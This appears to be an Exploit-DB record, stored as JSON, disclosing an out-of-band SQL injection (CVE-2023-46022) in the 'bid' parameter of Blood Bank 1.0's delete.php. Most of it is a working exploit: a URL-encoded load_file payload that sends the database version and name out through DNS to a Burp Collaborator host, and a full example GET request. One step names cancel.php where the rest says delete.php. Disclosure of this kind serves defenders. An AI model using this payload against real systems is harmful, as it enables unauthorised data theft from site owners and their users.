{"source": "https://www.exploit-db.com/exploits/51912", "vulnName": "Blood Bank 1.0 - 'bid' SQLi", "vulnEDBID": "51912", "vulnCVE": "2023-46022", "author": "ERSIN ERENLER", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-20", "vulnContent": "# Exploit Title: Blood Bank 1.0 - 'bid' SQLi\n# Date: 2023-11-15\n# Exploit Author: Ersin Erenler\n# Vendor Homepage: https://code-projects.org/blood-bank-in-php-with-source-code\n# Software Link: https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip\n# Version: 1.0\n# Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0\n# CVE : CVE-2023-46022\n\n-------------------------------------------------------------------------------\n\n# Description:\n\nThe 'bid' parameter in the /delete.php file of Code-Projects Blood Bank V1.0 is susceptible to Out-of-Band SQL Injection. This vulnerability stems from inadequate protection mechanisms, allowing attackers to exploit the parameter using Burp Collaborator to initiate OOB SQL injection attacks. Through this technique, an attacker can potentially extract sensitive information from the databases.\n\nVulnerable File: /delete.php\n\nParameter Name: bid\n\n# Proof of Concept:\n----------------------\n\n1. Intercept the request to cancel.php via Burp Suite\n2. Inject the payload to the vulnerable parameters\n3. Payload: 3'%2b(select%20load_file(concat('\\\\\\\\',version(),'.',database(),'.collaborator-domain\\\\a.txt')))%2b'\n4. Example request for bid parameter:\n---\n\nGET /bloodbank/file/delete.php?bid=3'%2b(select%20load_file(concat('\\\\\\\\',version(),'.',database(),'.domain.oastify.com\\\\a.txt')))%2b' HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nReferer: http://localhost/bloodbank/bloodinfo.php\nCookie: PHPSESSID=<some-cookie-value>\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\n---\n5. Database and version information is seized via Burp Suite Collaborator\n            "}